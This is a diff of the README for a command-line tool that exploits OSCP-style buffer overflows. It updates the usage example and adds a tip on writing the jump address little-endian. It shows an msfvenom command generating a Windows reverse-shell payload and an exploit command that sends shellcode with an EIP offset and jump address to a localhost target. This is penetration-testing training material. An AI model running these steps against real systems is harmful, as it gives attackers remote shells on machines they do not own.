@@ -6,8 +6,8 @@
 ![Issues](https://img.shields.io/github/issues/sradley/overflow?style=flat-square)
 ![Go Version](https://img.shields.io/github/go-mod/go-version/sradley/overflow?style=flat-square)
 
-Overflow is a command-line tool used for exploiting OSCP-style buffer
-overflow vulnerabilities with a focus on rapid exploitation. However, I would
+Overflow is a command-line tool used exploiting OSCP-style buffer overflow
+vulnerabilities with a focus on rapid exploitation. However, I would
 **strongly** suggest that you understand everything that this tool can do,
 particularly if you're planning on getting your OSCP certification. Have fun!
 
@@ -274,9 +274,12 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321 \
 ```
 
 Then just use the tool as follows, ensuring you include the offset to the EIP
-register and the jump address in the format used below.
+register and the jump address in the format used below. Don't forget that if
+the target system is little-endian you need to write the jump address
+backwards (e.g. if the address is "\x01\x02\x03\x04", write it as
+"\x04\x03\x02\x01").
 ```
-$ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "0x5f4a358f" -S path/to/payload.shell
+$ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "\x5f\x4a\x35\x8f" -S path/to/payload.shell
 ```
 ```
   ______   __   __ ______   ______
@@ -298,7 +301,7 @@ $ overflow exploit -H 127.0.0.1 -P 4444 -o 160 -j "0x5f4a358f" -S path/to/payloa
  :: Host        : 127.0.0.1
  :: Port        : 4444
  :: Offset      : 160
- :: Jump        : "0x5f4a358f"
+ :: Jump        : "\x5f\x4a\x35\x8f"
  :: Shell       : path/to/payload.shell
 ──────────────────────────────────────────────────
  > Reading shellcode.
